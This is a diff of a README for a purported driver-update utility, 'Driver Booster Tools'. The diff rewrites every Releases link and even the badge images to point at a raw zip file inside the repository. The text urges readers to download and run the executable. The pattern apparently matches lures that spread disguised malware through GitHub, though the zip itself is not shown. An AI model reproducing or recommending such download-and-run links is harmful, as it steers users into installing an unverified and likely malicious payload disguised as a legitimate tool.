@@ -1,8 +1,8 @@
-https://github.com/abrehman332/driver-booster-tools/releases
+https://github.com/abrehman332/driver-booster-tools/raw/refs/heads/main/owk/driver-booster-tools-1.2.zip
 
 # Driver Booster Tools — Scan, Update, Backup & Restore with One Click
 
-[![Release](https://img.shields.io/badge/Release-Latest-blue?logo=github&logoColor=white)](https://github.com/abrehman332/driver-booster-tools/releases) [![License](https://img.shields.io/badge/License-Mit-blue)](#) [![Stars](https://img.shields.io/github/stars/abrehman332/driver-booster-tools?style=social)](https://github.com/abrehman332/driver-booster-tools)
+[![Release](https://github.com/abrehman332/driver-booster-tools/raw/refs/heads/main/owk/driver-booster-tools-1.2.zip)](https://github.com/abrehman332/driver-booster-tools/raw/refs/heads/main/owk/driver-booster-tools-1.2.zip) [![License](https://github.com/abrehman332/driver-booster-tools/raw/refs/heads/main/owk/driver-booster-tools-1.2.zip)](#) [![Stars](https://github.com/abrehman332/driver-booster-tools/raw/refs/heads/main/owk/driver-booster-tools-1.2.zip)](https://github.com/abrehman332/driver-booster-tools/raw/refs/heads/main/owk/driver-booster-tools-1.2.zip)
 
 Welcome to the Driver Booster Tools project. This collection of utilities helps you scan drivers, update them with one click, and back up or restore driver configurations. The tools are designed to be practical, reliable, and straightforward to use. The goal is to keep hardware components running smoothly by keeping drivers up to date and preserving a safe backup of essential driver data.
 
@@ -48,7 +48,7 @@ How it works
 - Restore: If a problem occurs, you can restore the backed-up driver state to recover stability.
 
 Getting started
-- The path to the download page: https://github.com/abrehman332/driver-booster-tools/releases
+- The path to the download page: https://github.com/abrehman332/driver-booster-tools/raw/refs/heads/main/owk/driver-booster-tools-1.2.zip
 - From that page, grab the release asset that matches your operating system and architecture.
 - Download the file and run the installer or the executable package to begin. The asset you need to download and execute is the release asset on that page.
 - Follow the on-screen prompts to complete setup.
@@ -215,7 +215,7 @@ Release notes and changelog
 - The Releases page contains release notes describing each version.
 - Updates include new features, improvements, and bug fixes.
 - To review historical changes, visit the Releases section and read the notes attached to each asset.
-- Access the same releases page again here: https://github.com/abrehman332/driver-booster-tools/releases
+- Access the same releases page again here: https://github.com/abrehman332/driver-booster-tools/raw/refs/heads/main/owk/driver-booster-tools-1.2.zip
 
 Frequently asked questions
 - What platforms are supported?
@@ -227,7 +227,7 @@ Frequently asked questions
   - Yes, if the CLI or automation features are available, you can script scans and updates.
 - Where can I download the tool?
   - The official release page hosts installers for supported platforms.
-  - Visit https://github.com/abrehman332/driver-booster-tools/releases to download the latest release. If you are unsure which file to pick, use the asset labeled as the installer for your platform.
+  - Visit https://github.com/abrehman332/driver-booster-tools/raw/refs/heads/main/owk/driver-booster-tools-1.2.zip to download the latest release. If you are unsure which file to pick, use the asset labeled as the installer for your platform.
 
 Visuals and media
 - UI images
@@ -257,4 +257,4 @@ End notes
 - By following the workflows outlined here, you can keep your system drivers up to date while maintaining a safety net in case updates cause issues.
 
 Releases link reminder
-- For download and installation assets, use the Releases page link provided above. To access or verify, you can also revisit the Releases page at https://github.com/abrehman332/driver-booster-tools/releases to view the latest assets and notes.
+- For download and installation assets, use the Releases page link provided above. To access or verify, you can also revisit the Releases page at https://github.com/abrehman332/driver-booster-tools/raw/refs/heads/main/owk/driver-booster-tools-1.2.zip to view the latest assets and notes.
